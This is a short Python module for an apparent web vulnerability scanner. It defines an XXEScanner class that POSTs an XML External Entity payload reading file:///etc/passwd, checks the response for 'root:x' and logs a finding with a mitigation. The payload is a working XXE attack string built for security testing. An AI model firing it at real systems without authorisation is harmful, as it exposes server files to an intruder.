import requests
import logging

logger = logging.getLogger(__name__)

class XXEScanner:
    def __init__(self, path, method, get_params, post_body):
        self.path = path
        self.method = method
        self.get_params = get_params
        self.post_body = post_body
        self.session = requests.Session()
        self.findings = []

    def scan(self):
        payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        try:
            if self.method == 'POST':
                response = self.session.post(self.path, data=payload, headers={'Content-Type': 'application/xml'})
                if "root:x" in response.text:
                    finding = {
                        'type': 'XXE (A4)',
                        'severity': 'High',
                        'description': 'XML External Entity injection detected',
                        'reproduce': f'POST {self.path} with XXE payload',
                        'mitigation': 'Disable external entities in XML parser'
                    }
                    self.findings.append(finding)
                    # Real-time output
                    print(f"[VULN] {finding['type']} - Severity: {finding['severity']}")
                    print(f"  Description: {finding['description']}")
                    print(f"  Steps to Reproduce: {finding['reproduce']}")
                    print(f"  Mitigation: {finding['mitigation']}\n")
                    logger.info(f"Found: XXE at {self.path}")
        except requests.RequestException:
            pass
        return self.findings